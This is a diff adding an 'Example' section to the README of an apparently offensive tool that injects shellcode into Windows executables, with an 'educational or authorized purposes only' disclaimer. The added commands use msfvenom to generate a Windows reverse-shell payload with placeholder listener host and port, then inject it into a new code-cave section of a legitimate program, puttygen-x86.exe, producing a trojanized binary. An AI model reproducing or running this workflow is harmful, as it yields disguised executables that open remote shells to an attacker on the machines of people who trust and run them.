@@ -2,6 +2,14 @@
 
 **This project is meant to be used for educational purposes only or for authorized purposes.**
 
+## Example
+
+```
+$ msfvenom -p windows/shell_reverse_tcp -o /path/to/payload/local.py LHOST=x LPORT=y -f python
+## edit the local.py file and remove all the "python" portions so that it is just in /x00/x01/x02... format, new lines will be removed automatically
+## save new verseion as local.txt
+$ ./injectx86.py build -s txt:/path/to/payload/local.txt -f samples/puttygen-x86.exe --force --cave new-section -o /path/to/payloads/folder
+``` 
 ## Usage
 
 ```
